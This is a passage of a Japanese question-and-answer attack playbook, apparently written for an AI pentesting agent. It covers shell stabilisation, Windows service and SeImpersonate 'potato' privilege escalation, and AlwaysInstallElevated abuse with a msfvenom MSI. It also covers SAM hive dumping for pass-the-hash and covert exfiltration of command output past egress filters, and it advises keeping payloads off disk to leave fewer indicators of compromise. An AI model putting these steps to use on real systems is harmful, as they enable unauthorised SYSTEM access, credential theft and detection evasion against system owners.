**A2**: `perl -e 'exec "/bin/sh"'` で子 shell を起動できることがある。`SHELL=/bin/bash script -qc /bin/bash /dev/null`。`ssh -o ProxyCommand=... localhost` で ssh 自身に pty を起動させる。pty を起動できるツールを 1 つ見つければよい。
**Q3**: pty が起動したが Ctrl+C が直接 nc を殺す場合はどうするか?
**A3**: ローカル nc 側で `stty raw -echo; fg` によりローカル tty をリモートに渡し、さらに `export TERM=xterm; stty rows R cols C`(R/C はローカル端末のサイズに合わせる)。このステップでリモート tty がキーボードを完全に握り、vim/less/tmux が使える。
**Q4**: 対象マシンに python/perl/script/socat がない(最小コンテナ)場合、遮断されてどこへ方向転換するか?
**A4**: 「shell の担い手を替える」ことに方向転換する。nc を捨て、ssh(authorized_keys を仕込めれば)か http トンネル(reGeorg/chisel)で pty 付きの session を得る。または msfvenom の meterpreter が内蔵する pty 処理を使う。
**Q5**: SSH も通らず nc しかなく、しかも対話が必須の場合はどうするか?
**A5**: 静的コンパイルした `pty.py`(pyinstaller でパッケージ)か静的 socat をアップロードする。インターネット上には依存のない pty 起動の静的 binary が多数あり、事前に用意しておく。
**Q6**: tty が起動した後、backspace が ^H になり tab 補完がない場合はどうするか?
**A6**: `export TERM=xterm-256color`、`stty sane`、または `reset` を実行する。多くの場合、TERM 変数が正しく rows/cols が合えば直る。

### Windows サービス弱権限の権限昇格
**Q1**: Windows の低権限 shell を得て、サービスで権限昇格したい。先に何を見るか?
**A1**: `sc query type= service state= all`(または `Get-Service`)でサービスを列挙し、それぞれに `sc qc サービス名` で BINARY_PATH と SERVICE_START_NAME(LocalSystem か)を見る。判定基準:LocalSystem サービスが権限昇格の対象で、他はそれほど価値がない。
**Q2**: どの種のサービス設定ミスが利用できるか?
**A2**: 3 種類である:(1) サービスのバイナリパスが引用符なしで空白を含む(定番の unquoted service path)。(2) サービスのバイナリまたは所在ディレクトリを現在のユーザーが書き込める(直接 binary を置換)。(3) サービス自体が SERVICE_CHANGE_CONFIG を許可(sc config でパスを変更して再起動)。ツール:accesschk.exe または icacls で 1 つずつ調べる。
**Q3**: unquoted パスを見つけた場合、どう利用するか?
**A3**: パスが `C:\Program Files\App Foo\bin.exe` のとき、`C:\Program.exe` または `C:\Program Files\App.exe` が書き込み可能なら、サービス起動時に Windows が先に短いパスを試し、悪意あるバイナリが SYSTEM で実行される。判定基準:各中間パスの書き込み権限を確認する。
**Q4**: サービス権限が厳しく、パスも正しい場合、どう攻めるか?
**A4**: 「サービス依存」または「DLL ハイジャック」に方向転換する。サービスがロードする DLL が PATH 検索で書き込み可能なディレクトリに当たるなら、DLL ハイジャックを使う。またはサービスが auto-restart(RECOVERY オプション)かを見て、crash をトリガーして再起動させ、新しい binary をロードさせる。
**Q5**: 全サービスの設定が正しい場合、遮断されてどこへ方向転換するか?
**A5**: Windows 特権のディメンションに方向転換する。`whoami /priv` で SeImpersonate、SeAssignPrimaryToken、SeBackup、SeRestore があるか見る。どれかがあれば動かせる(次の連鎖を参照)。
**Q6**: サービスの変更はシステム再起動後にしか効かないが、待てない場合はどうするか?
**A6**: SERVICE_STOP+SERVICE_START 権限があれば即座に `sc stop && sc start` する。なければサービスが crash-restart かを見て、故意に現在のサービスをクラッシュさせる(トリガーできれば)。または auto-run 項目を変更して次回ログインを待つ。

### Windows SeImpersonate / potato ファミリーの選定
**Q1**: `whoami /priv` で SeImpersonatePrivilege が有効と見えた。それでどう権限昇格するか?
**A1**: potato ファミリーを使う。RottenPotato/JuicyPotato/PrintSpoofer/RoguePotato/GodPotato など。考え方は共通で、SYSTEM サービスを誘導して偽の RPC/パイプに認証させ、SYSTEM token を得て CreateProcessWithToken する。判定基準:SeImpersonate が核心の前提で、IIS/MSSQL/サービスアカウント身元によくある。
**Q2**: Windows バージョン別にどの Potato を選ぶか?
**A2**: Server 2016 以前は JuicyPotato で全滅できる。Server 2019/Win10 1809+ は PrintSpoofer(print spooler を利用)か RoguePotato(DCOM で別のマシンへ外部通信が必要)。Server 2022/Win11 は GodPotato(RPC over NP を利用)。判定基準:先にバージョンを見てから選ぶ。盲試しない。
**Q3**: PrintSpoofer が spooler サービスの起動を要求するが、無効にされている場合はどうするか?
**A3**: RoguePotato(攻撃者が制御するマシンへ 445/135 で外部通信できる必要)または GodPotato に替える。判定基準:1 つが駄目なら次を試す。potato ファミリーは相互補完である。
**Q4**: token を得た後、CreateProcessAsUser がエラーを返す場合はどうするか?
**A4**: 2 つに分ける:(1) token 種別が primary でないなら、DuplicateTokenEx で primary に変換する。(2) 対象 session 番号が違うなら、新プロセスに session 0 を指定するか追随させる。ツールが内蔵処理するが、手作業で API 呼び出しするなら lpDesktop/lpCurrentDirectory に注意する。
**Q5**: SeImpersonate がなく SeBackupPrivilege がある場合はどうするか?
**A5**: 「レジストリ hive dump」に方向転換する。SeBackup は SAM/SYSTEM/SECURITY hive を含む任意ファイルの読み取りを許可する。`reg save HKLM\SAM sam.hive` の後、オフラインで secretsdump してローカル hash を取り、pass-the-hash する。
**Q6**: potato が全て失敗し、Windows も最新パッチで hot exp がない場合、遮断されてどこへ方向転換するか?
**A6**: Windows のクラウド内部ネットワークに方向転換する。ドメイン参加か(`systeminfo | findstr Domain`)、参加していれば AD 側の攻撃面(Kerberoast、ADCS、ntlm relay)に切り替える。単機の権限昇格ができなければ横展開してドメインコントローラーを攻める。

### AlwaysInstallElevated の確認
**Q1**: 低権限 Windows の低コスト権限昇格で、最初に必ず確認する項目は何か?
**A1**: `reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated` と HKLM の同パス。両方が 1 なら該当で、任意のユーザーが SYSTEM で MSI をインストールできる。判定基準:2 つのキーが両方 1 である必要があり、片方だけでは効かない。
**Q2**: 該当した後、どう使うか?
**A2**: `msfvenom -f msi -p windows/x64/exec ...` で MSI を生成し、`msiexec /quiet /qn /i evil.msi` で SYSTEM として実行する。全工程に EXP は不要である。
**Q3**: HKCU だけが 1 で HKLM が違う場合はどうするか?
**A3**: このポリシーは 2 つのキーが同時に有効でないと効かない。他の手軽な項目に転換する:未引用サービスパス、書き込み可能なサービスバイナリ、Scheduled Tasks の SYSTEM タスクが変更可能か。
**Q4**: 2 つのキーが両方 1 だが msiexec が「権限不足」エラーを返す場合はどうするか?
**A4**: UAC 状態と現在のユーザーが non-admin か確認する(このトリックは non-admin 向けで、admin は逆に UAC の影響を受ける)。または `/qb` を `/qn` に替える、payload を変える。
**Q5**: キーがどちらも 1 でなく、ポリシーが無効の場合、遮断されてどこへ方向転換するか?
**A5**: 他の Windows の一般的な設定ミス列挙に方向転換する(winPEAS 系の考え方。agent はリストを内蔵すべき):UAC bypass、UAC virtual store、書き込み可能な startup ディレクトリ、Startup Registry Run キー、Scheduled Task の弱い権限、Credential Manager に保存された認証情報。
**Q6**: MSI で権限昇格できるようになったが、MSI をディスクに残したくない場合はどうするか?
**A6**: msiexec は http/smb URL からのインストールに対応するので、payload をディスクに置かない。または小さな MSI でアカウントを Administrators グループに加えるだけにし、インストール後に削除する。判定基準:ディスクに置くものが少ないほど IoC が少ない。

### 外向きが制限され、実行は成功するが出力が見えない - 出力チャネルの選択
**Q1**: RCE が通ったが出力がなく、対象がインターネットへの外部通信を許可しない。どう出力を得るか?
**A1**: 優先順位でチャネルを替える:(1) HTTP レスポンスへのインライン出力(コマンド出力を現在のリクエストのレスポンスに埋める)。(2) ファイルを web アクセス可能なディレクトリに書いて GET する。(3) DNS 持ち出し(dnslog)。(4) サイドチャネル(時間ベース、エラーベース)。(5) 内部ネットワークの中間踏み台へリバースする。判定基準:対象のネットワークポリシーがどのチャネルを通すかを決める。
**Q2**: disable_functions 場面で、コマンドが LD_PRELOAD で fork 子プロセスを起動し、本体の PHP が待たない場合、どうインライン出力するか?
**A2**: LD_PRELOAD の so 内でコマンド出力をファイル `/tmp/x.out` に書かせ、PHP 層で `file_get_contents('/tmp/x.out')` を読んでレスポンスボディに載せる。判定基準:ファイルブリッジが最も安定したチャネルで、ほぼ制限を受けない。
**Q3**: 対象の open_basedir が /tmp を遮る場合はどうするか?
**A3**: web ディレクトリ内で PHP が書き込み権限を持つ場所に書くか、/dev/shm に書く(あまり遮られない)。または so に出力をパイプで PHP の fd 1 へ戻させる(コマンドと PHP の fd が関連する必要がある)。
**Q4**: 書き込み権限が全くなく外部通信もない場合、レスポンスヘッダ/HTTP status code でエンコードできるか?
**A4**: できる。リクエストごとに短いコマンドを実行し、出力を status code の数値や header の長さにエンコードして、複数リクエストで復元する。転送は遅いが実行可能で、小さなデータ(フラグ/パスワード)向きである。
**Q5**: 対象が厳格な egress filter で DNS も外へ出ない場合、遮断されてどこへ方向転換するか?
**A5**: 「内部ネットワークの踏み台」に方向転換する。先に対象がアクセスできる内部ホスト(内部 web、内部 DNS)を探して中継にする。まずそこへリバースし、そこから外へ出る。または ICMP トンネル(ICMP が出るなら)、TCP over DNS で内部 DNS サーバーを使う(再帰を許可する内部 DNS もある)。
**Q6**: 持ち出しが全く通らない場合、結果をどう届けるか?
**A6**: 「最小情報の持ち帰り」に方向転換する。重要な 1KB データ(パスワード、鍵)だけを取り、HTTP キャッシュマーク、cookie、URL セグメントでエンコードして持ち帰る。ペネトレーションの最終的な納品は、多くの場合数十バイトの重要な secret だけで済む。
